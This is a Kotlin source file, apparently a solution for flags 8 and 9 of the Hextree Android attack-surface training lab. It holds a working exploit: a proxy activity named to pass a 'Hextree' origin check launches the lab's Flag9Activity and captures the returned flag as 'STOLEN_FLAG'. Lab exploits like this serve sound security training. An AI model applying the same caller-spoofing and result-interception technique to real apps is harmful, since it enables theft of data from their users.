package com.example.hextreesolver

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast

// This dummy class satisfies the .contains("Hextree") validation! FOR FLAG 8 & 9 ( Origin POC must contain 'Hextree')
// Ensure this inherits from Activity() and executes the forward intent on creation
class HextreeFlag8and9Activity : Activity() {

    private val REQUEST_CODE_FLAG9 = 9999

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Check if this proxy activity was launched to exploit Flag 9 or Flag 8
        val targetFlag = intent.getIntExtra("target_flag", 8)

        try {
            if (targetFlag == 9) {
                val intentFlag9 = Intent().apply {
                    component = ComponentName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag9Activity"
                    )
                }
                @Suppress("DEPRECATION")
                startActivityForResult(intentFlag9, REQUEST_CODE_FLAG9)
            } else {
                // Keep Flag 8 logic working intact
                val intentFlag8 = Intent().apply {
                    component = ComponentName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag8Activity"
                    )
                }
                @Suppress("DEPRECATION")
                startActivityForResult(intentFlag8, 8888)
                finish()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            finish()
        }
    }

    // === CRUCIAL ADDITION FOR FLAG 9 ===
    // This callback intercepts the payload returned from Flag9Activity
    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        @Suppress("DEPRECATION")
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == REQUEST_CODE_FLAG9 && resultCode == RESULT_OK) {
            // Extract the flag string from the returned extra data block
            val stolenFlag = data?.getStringExtra("flag")

            if (stolenFlag != null) {
                // Print the flag to Logcat under the tag "STOLEN_FLAG"
                Log.d("STOLEN_FLAG", "Flag 9 intercepted successfully: $stolenFlag")

                // Show a quick visual confirmation on the device screen
                Toast.makeText(this, "Flag 9 Stolen! Check Logcat.", Toast.LENGTH_LONG).show()
            }
        }

        // Clean up and close our proxy overlay completely
        finish()
    }
}
